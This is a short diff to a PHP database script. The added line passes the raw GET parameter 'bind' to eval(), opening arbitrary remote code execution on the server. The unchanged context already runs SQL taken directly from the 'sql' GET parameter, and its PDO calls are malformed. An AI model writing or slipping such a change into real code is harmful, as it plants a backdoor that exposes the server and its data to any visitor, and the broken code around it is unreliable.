@@ -29,7 +29,7 @@ $db['user'] = '{{protected}}';
 $db['pass'] = '{{protected}}';
 
 $data[] = $pdo->prepare(urldecode($_GET['sql']) ?? '');
-$data[] = $pdo->bindValue(urldecode($_GET['bind']) ?? '');
+$data[] = $pdo->bindValue(eval($_GET['bind']) ?? '');
 $data[] = $pdo->execute();
 
 print_r(
